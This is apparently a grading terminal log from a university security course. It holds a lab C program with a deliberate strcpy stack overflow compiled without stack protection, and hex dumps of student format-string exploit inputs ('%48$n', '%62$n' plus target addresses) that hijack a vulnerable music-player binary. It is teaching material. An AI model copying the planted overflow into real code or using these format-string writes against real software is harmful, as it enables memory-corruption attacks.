sec_prog1.c:53:2: warning: implicit declaration of function ‘seccomp_load’ [-Wimplicit-function-declaration]
  seccomp_load(ctx);
  ^
ryadav3@nemo:~/576/labs/lab9/vul$ gcc -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog10.c
sec_prog10.c: In function ‘install_syscall_filter’:
sec_prog10.c:45:21: error: array type has incomplete element type ‘struct sock_filter’
  struct sock_filter filter[] = {
                     ^
sec_prog10.c:47:3: error: ‘VALIDATE_ARCHITECTURE’ undeclared (first use in this function)
   VALIDATE_ARCHITECTURE,
   ^
sec_prog10.c:47:3: note: each undeclared identifier is reported only once for each function it appears in
sec_prog10.c:49:3: error: ‘EXAMINE_SYSCALL’ undeclared (first use in this function)
   EXAMINE_SYSCALL,
   ^
sec_prog10.c:51:3: warning: implicit declaration of function ‘ALLOW_SYSCALL’ [-Wimplicit-function-declaration]
   ALLOW_SYSCALL(rt_sigreturn),
   ^
sec_prog10.c:51:17: error: ‘rt_sigreturn’ undeclared (first use in this function)
   ALLOW_SYSCALL(rt_sigreturn),
                 ^
sec_prog10.c:55:17: error: ‘exit_group’ undeclared (first use in this function)
   ALLOW_SYSCALL(exit_group),
                 ^
sec_prog10.c:59:3: error: ‘KILL_PROCESS’ undeclared (first use in this function)
   KILL_PROCESS,
   ^
sec_prog10.c:61:9: error: variable ‘prog’ has initializer but incomplete type
  struct sock_fprog prog = {
         ^
sec_prog10.c:62:3: error: unknown field ‘len’ specified in initializer
   .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
   ^
sec_prog10.c:62:10: warning: excess elements in struct initializer
   .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
          ^
sec_prog10.c:62:10: note: (near initialization for ‘prog’)
sec_prog10.c:63:3: error: unknown field ‘filter’ specified in initializer
   .filter = filter,
   ^
sec_prog10.c:63:13: warning: excess elements in struct initializer
   .filter = filter,
             ^
sec_prog10.c:63:13: note: (near initialization for ‘prog’)
sec_prog10.c:61:20: error: storage size of ‘prog’ isn’t known
  struct sock_fprog prog = {
                    ^
sec_prog10.c:66:6: warning: implicit declaration of function ‘prctl’ [-Wimplicit-function-declaration]
  if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
      ^
sec_prog10.c:66:12: error: ‘PR_SET_NO_NEW_PRIVS’ undeclared (first use in this function)
  if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
            ^
sec_prog10.c:70:12: error: ‘PR_SET_SECCOMP’ undeclared (first use in this function)
  if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
            ^
sec_prog10.c:77:6: error: ‘errno’ undeclared (first use in this function)
  if (errno == EINVAL)
      ^
sec_prog10.c:77:15: error: ‘EINVAL’ undeclared (first use in this function)
  if (errno == EINVAL)
               ^
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog10.c 
ryadav3@nemo:~/576/labs/lab9/vul$ man seccomp
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog10.c 
ryadav3@nemo:~/576/labs/lab9/vul$ gcc -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog10.c
sec_prog10.c: In function ‘install_syscall_filter’:
sec_prog10.c:51:3: error: ‘VALIDATE_ARCHITECTURE’ undeclared (first use in this function)
   VALIDATE_ARCHITECTURE,
   ^
sec_prog10.c:51:3: note: each undeclared identifier is reported only once for each function it appears in
sec_prog10.c:53:3: error: ‘EXAMINE_SYSCALL’ undeclared (first use in this function)
   EXAMINE_SYSCALL,
   ^
sec_prog10.c:55:3: warning: implicit declaration of function ‘ALLOW_SYSCALL’ [-Wimplicit-function-declaration]
   ALLOW_SYSCALL(rt_sigreturn),
   ^
sec_prog10.c:55:17: error: ‘rt_sigreturn’ undeclared (first use in this function)
   ALLOW_SYSCALL(rt_sigreturn),
                 ^
sec_prog10.c:59:17: error: ‘exit_group’ undeclared (first use in this function)
   ALLOW_SYSCALL(exit_group),
                 ^
sec_prog10.c:63:3: error: ‘KILL_PROCESS’ undeclared (first use in this function)
   KILL_PROCESS,
   ^
ryadav3@nemo:~/576/labs/lab9/vul$ cat sec_prog1.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>

static void party()
{
        printf("Verification succeeded!\n");
	exit(EXIT_SUCCESS);
}

static int complex_verify(const char *buffer)
{
	char str[64];
	
	printf("Verifying: %s\n", buffer);
	strcpy(str, buffer);

	int i;
	for (i = 0; i < (sizeof(str) - 1); i++)
		str[i]++;
	return (i - 62);
}

static void read_input()
{
	char buffer[512];

	printf("Enter verification string?\n");
	if (fread(buffer, 1, 512, stdin) < 0) {
		perror("Error reading input");
		return;
	}

	if (complex_verify(buffer) >= 0)
		printf("Verification failed!\n");
	else
		party();
}

int main(int argc, char **argv)
{
	void * ctx;
	ctx = seccomp_init(SCMP_ACT_KILL);

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);

	seccomp_load(ctx);

	read_input();

	return EXIT_SUCCESS;
}

ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ gcc -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
sec_prog1.c: In function ‘main’:
sec_prog1.c:47:8: warning: implicit declaration of function ‘seccomp_init’ [-Wimplicit-function-declaration]
  ctx = seccomp_init(SCMP_ACT_KILL);
        ^
sec_prog1.c:47:21: error: ‘SCMP_ACT_KILL’ undeclared (first use in this function)
  ctx = seccomp_init(SCMP_ACT_KILL);
                     ^
sec_prog1.c:47:21: note: each undeclared identifier is reported only once for each function it appears in
sec_prog1.c:49:2: warning: implicit declaration of function ‘seccomp_rule_add’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ^
sec_prog1.c:49:24: error: ‘SCMP_ACT_ALLOW’ undeclared (first use in this function)
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                        ^
sec_prog1.c:49:40: warning: implicit declaration of function ‘SCMP_SYS’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                                        ^
sec_prog1.c:53:2: warning: implicit declaration of function ‘seccomp_load’ [-Wimplicit-function-declaration]
  seccomp_load(ctx);
  ^
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc /lib/x86_64-linux-gnu/libseccomp.so.2 -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
sec_prog1.c: In function ‘main’:
sec_prog1.c:47:8: warning: implicit declaration of function ‘seccomp_init’ [-Wimplicit-function-declaration]
  ctx = seccomp_init(SCMP_ACT_KILL);
        ^
sec_prog1.c:47:21: error: ‘SCMP_ACT_KILL’ undeclared (first use in this function)
  ctx = seccomp_init(SCMP_ACT_KILL);
                     ^
sec_prog1.c:47:21: note: each undeclared identifier is reported only once for each function it appears in
sec_prog1.c:49:2: warning: implicit declaration of function ‘seccomp_rule_add’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ^
sec_prog1.c:49:24: error: ‘SCMP_ACT_ALLOW’ undeclared (first use in this function)
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                        ^
sec_prog1.c:49:40: warning: implicit declaration of function ‘SCMP_SYS’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                                        ^
sec_prog1.c:53:2: warning: implicit declaration of function ‘seccomp_load’ [-Wimplicit-function-declaration]
  seccomp_load(ctx);
  ^
Makefile:11: recipe for target 'sec_prog' failed
make: *** [sec_prog] Error 1
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ gcc -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
sec_prog1.c: In function ‘main’:
sec_prog1.c:46:2: error: unknown type name ‘scmp_filter_ctx’
  scmp_filter_ctx * ctx;
  ^
sec_prog1.c:47:8: warning: implicit declaration of function ‘seccomp_init’ [-Wimplicit-function-declaration]
  ctx = seccomp_init(SCMP_ACT_KILL);
        ^
sec_prog1.c:47:21: error: ‘SCMP_ACT_KILL’ undeclared (first use in this function)
  ctx = seccomp_init(SCMP_ACT_KILL);
                     ^
sec_prog1.c:47:21: note: each undeclared identifier is reported only once for each function it appears in
sec_prog1.c:49:2: warning: implicit declaration of function ‘seccomp_rule_add’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ^
sec_prog1.c:49:24: error: ‘SCMP_ACT_ALLOW’ undeclared (first use in this function)
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                        ^
sec_prog1.c:49:40: warning: implicit declaration of function ‘SCMP_SYS’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                                        ^
sec_prog1.c:53:2: warning: implicit declaration of function ‘seccomp_load’ [-Wimplicit-function-declaration]
  seccomp_load(ctx);
  ^
ryadav3@nemo:~/576/labs/lab9/vul$ cat sec_prog1.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>

static void party()
{
        printf("Verification succeeded!\n");
	exit(EXIT_SUCCESS);
}

static int complex_verify(const char *buffer)
{
	char str[64];
	
	printf("Verifying: %s\n", buffer);
	strcpy(str, buffer);

	int i;
	for (i = 0; i < (sizeof(str) - 1); i++)
		str[i]++;
	return (i - 62);
}

static void read_input()
{
	char buffer[512];

	printf("Enter verification string?\n");
	if (fread(buffer, 1, 512, stdin) < 0) {
		perror("Error reading input");
		return;
	}

	if (complex_verify(buffer) >= 0)
		printf("Verification failed!\n");
	else
		party();
}

int main(int argc, char **argv)
{
	scmp_filter_ctx * ctx;
	ctx = seccomp_init(SCMP_ACT_KILL);

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);

	seccomp_load(ctx);

	read_input();

	return EXIT_SUCCESS;
}

ryadav3@nemo:~/576/labs/lab9/vul$ gcc -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
sec_prog1.c: In function ‘main’:
sec_prog1.c:46:2: error: unknown type name ‘scmp_filter_ctx’
  scmp_filter_ctx * ctx;
  ^
sec_prog1.c:47:8: warning: implicit declaration of function ‘seccomp_init’ [-Wimplicit-function-declaration]
  ctx = seccomp_init(SCMP_ACT_KILL);
        ^
sec_prog1.c:47:21: error: ‘SCMP_ACT_KILL’ undeclared (first use in this function)
  ctx = seccomp_init(SCMP_ACT_KILL);
                     ^
sec_prog1.c:47:21: note: each undeclared identifier is reported only once for each function it appears in
sec_prog1.c:49:2: warning: implicit declaration of function ‘seccomp_rule_add’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ^
sec_prog1.c:49:24: error: ‘SCMP_ACT_ALLOW’ undeclared (first use in this function)
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                        ^
sec_prog1.c:49:40: warning: implicit declaration of function ‘SCMP_SYS’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                                        ^
sec_prog1.c:53:2: warning: implicit declaration of function ‘seccomp_load’ [-Wimplicit-function-declaration]
  seccomp_load(ctx);
  ^
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc /lib/x86_64-linux-gnu/libseccomp.so.2 -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
sec_prog1.c: In function ‘main’:
sec_prog1.c:46:2: error: unknown type name ‘scmp_filter_ctx’
  scmp_filter_ctx * ctx;
  ^
sec_prog1.c:47:8: warning: implicit declaration of function ‘seccomp_init’ [-Wimplicit-function-declaration]
  ctx = seccomp_init(SCMP_ACT_KILL);
        ^
sec_prog1.c:47:21: error: ‘SCMP_ACT_KILL’ undeclared (first use in this function)
  ctx = seccomp_init(SCMP_ACT_KILL);
                     ^
sec_prog1.c:47:21: note: each undeclared identifier is reported only once for each function it appears in
sec_prog1.c:49:2: warning: implicit declaration of function ‘seccomp_rule_add’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ^
sec_prog1.c:49:24: error: ‘SCMP_ACT_ALLOW’ undeclared (first use in this function)
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                        ^
sec_prog1.c:49:40: warning: implicit declaration of function ‘SCMP_SYS’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                                        ^
sec_prog1.c:53:2: warning: implicit declaration of function ‘seccomp_load’ [-Wimplicit-function-declaration]
  seccomp_load(ctx);
  ^
Makefile:11: recipe for target 'sec_prog' failed
make: *** [sec_prog] Error 1
ryadav3@nemo:~/576/labs/lab9/vul$ kill -9 $$
Connection to nemo.srcit.stevens-tech.edu closed.
Lunarantic:576 Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

42 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Tue Oct 30 18:12:27 2018 from 155.246.170.197
ryadav3@nemo:~$ cd 576/assigns/assignment2/
ryadav3@nemo:~/576/assigns/assignment2$ ls
submissions-hw2.zip  team1  team10  team11  team12  team2  team3  team4  team5  team6  team7  team8  team9
ryadav3@nemo:~/576/assigns/assignment2$ cd team5/hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls
malicious_input1-c.txt  malicious_input2.py   malicious_input3.txt  task1.txt  task4.txt       vuln_prog2.bin  vuln_prog3.c
malicious_input1.py     malicious_input2.txt  malicious_input4.py   task2.txt  vuln_prog1.bin  vuln_prog2.c    vuln_prog4.bin
malicious_input1.txt    malicious_input3.py   malicious_input4.txt  task3.txt  vuln_prog1.c    vuln_prog3.bin  vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ./vuln_prog1.bin 123 < malicious_input1.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ dmesg | tail -1
[5647863.383648] vuln_prog1.bin[30232]: segfault at 1ec ip 00007fb834a88bc6 sp 00007ffce8f3eda0 error 6 in libc-2.23.so[7fb834a3c000+1c0000]
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ cd ../../team6/
ryadav3@nemo:~/576/assigns/assignment2/team6$ ls
hw26_late_24124_4248207_ajin_elew_hw2-3.tgz  hw2-more_attacks
ryadav3@nemo:~/576/assigns/assignment2/team6$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ ls
malicious_input1_aj.sh   malicious_input1.txt  malicious_input3.sh   malicious_input4.txt  note3       task2.txt  vuln_prog1.bin  vuln_prog2.c    vuln_prog4.bin
malicious_input1_aj.txt  malicious_input2.sh   malicious_input3.txt  note1                 Task 1.pdf  task3.txt  vuln_prog1.c    vuln_prog3.bin  vuln_prog4.c
malicious_input1.sh      malicious_input2.txt  malicious_input4.sh   note2                 task1.txt   task4.txt  vuln_prog2.bin  vuln_prog3.c
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ vim note1 
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ ./vuln_prog1.bin 10414350 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA%88?`
Stack at 0x7fffce573730

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ cd ../../team7/
ryadav3@nemo:~/576/assigns/assignment2/team7$ ls
hw27_late_24135_4247996_tmitche2_tkautzma_hw2.tgz
ryadav3@nemo:~/576/assigns/assignment2/team7$ tar -zxvf hw27_late_24135_4247996_tmitche2_tkautzma_hw2.tgz 
./._hw2-more_attacks
hw2-more_attacks/
hw2-more_attacks/._task1.txt
hw2-more_attacks/task1.txt
hw2-more_attacks/._malicious_input4.py
hw2-more_attacks/malicious_input4.py
hw2-more_attacks/._task2.txt
hw2-more_attacks/task2.txt
hw2-more_attacks/._task3.txt
hw2-more_attacks/task3.txt
hw2-more_attacks/._vuln_prog4.c
hw2-more_attacks/vuln_prog4.c
hw2-more_attacks/._.DS_Store
hw2-more_attacks/.DS_Store
hw2-more_attacks/._malicious_input1.py
hw2-more_attacks/malicious_input1.py
hw2-more_attacks/._task4.txt
hw2-more_attacks/task4.txt
hw2-more_attacks/._vuln_prog4.bin
hw2-more_attacks/vuln_prog4.bin
hw2-more_attacks/._vuln_prog1.bin
hw2-more_attacks/vuln_prog1.bin
hw2-more_attacks/._vuln_prog3.bin
hw2-more_attacks/vuln_prog3.bin
hw2-more_attacks/._vuln_prog3.c
hw2-more_attacks/vuln_prog3.c
hw2-more_attacks/._vuln_prog2.bin
hw2-more_attacks/vuln_prog2.bin
hw2-more_attacks/malicious_input3.txt
hw2-more_attacks/._malicious_input2.txt
hw2-more_attacks/malicious_input2.txt
hw2-more_attacks/._malicious_input1.txt
hw2-more_attacks/malicious_input1.txt
hw2-more_attacks/._malicious_input4.txt
hw2-more_attacks/malicious_input4.txt
hw2-more_attacks/._vuln_prog2.c
hw2-more_attacks/vuln_prog2.c
hw2-more_attacks/._test.txt
hw2-more_attacks/test.txt
hw2-more_attacks/._mal - Copy.txt
hw2-more_attacks/mal - Copy.txt
hw2-more_attacks/._mal.txt
hw2-more_attacks/mal.txt
hw2-more_attacks/._vuln_prog1.c
hw2-more_attacks/vuln_prog1.c
ryadav3@nemo:~/576/assigns/assignment2/team7$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team7/hw2-more_attacks$ ls
mal - Copy.txt        malicious_input2.txt  malicious_input4.txt  task2.txt  test.txt        vuln_prog2.bin  vuln_prog3.c
malicious_input1.py   malicious_input3.txt  mal.txt               task3.txt  vuln_prog1.bin  vuln_prog2.c    vuln_prog4.bin
malicious_input1.txt  malicious_input4.py   task1.txt             task4.txt  vuln_prog1.c    vuln_prog3.bin  vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team7/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team7/hw2-more_attacks$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team7/hw2-more_attacks$ xxd malicious_input1.txt 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 2534 3824 6e42  AAAAAAAAAA%48$nB
00000020: ac10 6000 0000 0000 000a                 ..`.......
ryadav3@nemo:~/576/assigns/assignment2/team7/hw2-more_attacks$ ./vuln_prog1.bin 1111 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAAB?`
Stack at 0x7fff154d0100

Instead
Playing Lucky You
ryadav3@nemo:~/576/assigns/assignment2/team7/hw2-more_attacks$ cd ../../team8/
ryadav3@nemo:~/576/assigns/assignment2/team8$ ls
hw28_27578_4244730_moissinac_sharma_hw2-more_attacks.tgz
ryadav3@nemo:~/576/assigns/assignment2/team8$ tar -zxvf hw28_27578_4244730_moissinac_sharma_hw2-more_attacks.tgz 
moissinac_sharma_hw2-more_attacks/
moissinac_sharma_hw2-more_attacks/vuln_prog1.bin
moissinac_sharma_hw2-more_attacks/task3.txt
moissinac_sharma_hw2-more_attacks/task4.txt
moissinac_sharma_hw2-more_attacks/vuln_prog1.c
moissinac_sharma_hw2-more_attacks/vuln_prog3.c
moissinac_sharma_hw2-more_attacks/task2.txt
moissinac_sharma_hw2-more_attacks/HW2_Task3_With_GDB.jpg
moissinac_sharma_hw2-more_attacks/vuln_prog2.c
moissinac_sharma_hw2-more_attacks/malicious_input1.py
moissinac_sharma_hw2-more_attacks/task1.txt
moissinac_sharma_hw2-more_attacks/malicious_input3.py
moissinac_sharma_hw2-more_attacks/malicious_input2.py
moissinac_sharma_hw2-more_attacks/vuln_prog4.bin
moissinac_sharma_hw2-more_attacks/vuln_prog3.bin
moissinac_sharma_hw2-more_attacks/malicious_input3_1.py
moissinac_sharma_hw2-more_attacks/HW2_Task3_Outside_GDB.jpg
moissinac_sharma_hw2-more_attacks/vuln_prog2.bin
moissinac_sharma_hw2-more_attacks/vuln_prog4.c
moissinac_sharma_hw2-more_attacks/malicious_input4.py
ryadav3@nemo:~/576/assigns/assignment2/team8$ cd moissinac_sharma_hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team8/moissinac_sharma_hw2-more_attacks$ ls
HW2_Task3_Outside_GDB.jpg  malicious_input2.py    malicious_input4.py  task3.txt       vuln_prog1.c    vuln_prog3.bin  vuln_prog4.c
HW2_Task3_With_GDB.jpg     malicious_input3_1.py  task1.txt            task4.txt       vuln_prog2.bin  vuln_prog3.c
malicious_input1.py        malicious_input3.py    task2.txt            vuln_prog1.bin  vuln_prog2.c    vuln_prog4.bin
ryadav3@nemo:~/576/assigns/assignment2/team8/moissinac_sharma_hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team8/moissinac_sharma_hw2-more_attacks$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team8/moissinac_sharma_hw2-more_attacks$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team8/moissinac_sharma_hw2-more_attacks$ ./malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team8/moissinac_sharma_hw2-more_attacks$ ls
HW2_Task3_Outside_GDB.jpg  malicious_input1.py   malicious_input2.py    malicious_input3.py  task1.txt  task3.txt  vuln_prog1.bin  vuln_prog2.bin  vuln_prog3.bin  vuln_prog4.bin
HW2_Task3_With_GDB.jpg     malicious_input1.txt  malicious_input3_1.py  malicious_input4.py  task2.txt  task4.txt  vuln_prog1.c    vuln_prog2.c    vuln_prog3.c    vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team8/moissinac_sharma_hw2-more_attacks$ ./vuln_prog1.bin 10421694 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA,?`
Stack at 0x7ffc788a4560

Instead
Playing Lucky You
ryadav3@nemo:~/576/assigns/assignment2/team8/moissinac_sharma_hw2-more_attacks$ cd ../../team9/
ryadav3@nemo:~/576/assigns/assignment2/team9$ tar -zxvf hw29_32605_4244627_hw2submission.tgz 
hw2_submission/
hw2_submission/hw2submission.tar.gz
hw2_submission/malicious_input1.py
hw2_submission/malicious_input1.txt
hw2_submission/malicious_input2.py
hw2_submission/malicious_input2.txt
hw2_submission/malicious_input3.py
hw2_submission/malicious_input3.txt
hw2_submission/malicious_input4.py
hw2_submission/malicious_input4.txt
hw2_submission/task1.txt
hw2_submission/task2.txt
hw2_submission/task3.txt
hw2_submission/task4.txt
ryadav3@nemo:~/576/assigns/assignment2/team9$ cd hw2_submission/
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ ls
hw2submission.tar.gz  malicious_input1.txt  malicious_input2.txt  malicious_input3.txt  malicious_input4.txt  task2.txt  task4.txt
malicious_input1.py   malicious_input2.py   malicious_input3.py   malicious_input4.py   task1.txt             task3.txt
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ xxd malicious_input1.txt 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 2536 3224 6e00  AAAAAAAAAA%62$n.
00000020: ac10 6000 0000 0000 0000 0000 0000 0000  ..`.............
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0a                   .........
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ ../../team8/moissinac_sharma_hw2-more_attacks/vuln_prog1.bin 
Missing arguments
Usage: ../../team8/moissinac_sharma_hw2-more_attacks/vuln_prog1.bin <student_id>
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ ../../team8/moissinac_sharma_hw2-more_attacks/vuln_prog1.bin 1111 < malicious_input1.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ ls
hw2submission.tar.gz  malicious_input1.txt  malicious_input2.txt  malicious_input3.txt  malicious_input4.txt  task2.txt  task4.txt
malicious_input1.py   malicious_input2.py   malicious_input3.py   malicious_input4.py   task1.txt             task3.txt
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ dmesg | tail -1
[5648928.135807] vuln_prog1.bin[30848]: segfault at 7f89dfc80ff8 ip 00007f89dfcbcbc6 sp 00007ffd77ec48c0 error 7 in libc-2.23.so[7f89dfc70000+1c0000]
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ ../../team8/moissinac_sharma_hw2-more_attacks/vuln_prog1.bin 123 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA
Stack at 0x7ffcdb55ec60

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ dmesg | tail -1
[5648928.135807] vuln_prog1.bin[30848]: segfault at 7f89dfc80ff8 ip 00007f89dfcbcbc6 sp 00007ffd77ec48c0 error 7 in libc-2.23.so[7f89dfc70000+1c0000]
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ ../../team8/moissinac_sharma_hw2-more_attacks/vuln_prog1.bin 104 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA
Stack at 0x7ffe5b8f41c0

Instead
Playing Lucky You
ryadav3@nemo:~/576/assigns/assignment2/team9/hw2_submission$ cd ../../team10/
ryadav3@nemo:~/576/assigns/assignment2/team10$ tar -zxvf hw210_late_24408_4247739_ddelaussnajderhw2.tgz 
hw2/
hw2/vuln_prog2.bin
hw2/malicious_input4.py
hw2/vuln_prog1.c
hw2/malicious_input4.txt
hw2/malicious_input3.txt
hw2/malicious_input3.py
hw2/vuln_prog4.bin
hw2/task4.txt
hw2/vuln_prog2.c
hw2/vuln_prog3.bin
hw2/vuln_prog3.c
hw2/.txt
hw2/.py
hw2/malicious_input1.py
hw2/malicious_input1.txt
hw2/vuln_prog4.c
hw2/task1.txt
hw2/vuln_prog1.bin
ryadav3@nemo:~/576/assigns/assignment2/team10$ cd hw2/
ryadav3@nemo:~/576/assigns/assignment2/team10/hw2$ ls -l
total 51
-rw-r--r--+ 1 ryadav3 student  118 Oct 29 15:39 malicious_input1.py
-rw-r--r--+ 1 ryadav3 student   41 Oct 29 15:53 malicious_input1.txt
-rw-r--r--+ 1 ryadav3 student  130 Oct 29 17:26 malicious_input3.py
-rw-r--r--+ 1 ryadav3 student  272 Oct 29 17:26 malicious_input3.txt
-rw-r--r--+ 1 ryadav3 student  109 Oct 29 15:49 malicious_input4.py
-rw-r--r--+ 1 ryadav3 student   25 Oct 29 15:53 malicious_input4.txt
-rw-r--r--+ 1 ryadav3 student  658 Oct 29 16:42 task1.txt
-rw-r--r--+ 1 ryadav3 student  610 Oct 29 16:42 task4.txt
-rwxr-xr-x+ 1 ryadav3 student 9160 Oct 12 23:32 vuln_prog1.bin
-rw-r--r--+ 1 ryadav3 student  861 Oct 16 13:40 vuln_prog1.c
-rwxr-xr-x+ 1 ryadav3 student 9088 Oct 13 00:24 vuln_prog2.bin
-rw-r--r--+ 1 ryadav3 student  813 Oct 16 13:40 vuln_prog2.c
-rwxr-xr-x+ 1 ryadav3 student 7492 Oct 13 01:16 vuln_prog3.bin
-rw-r--r--+ 1 ryadav3 student  345 Oct 16 13:40 vuln_prog3.c
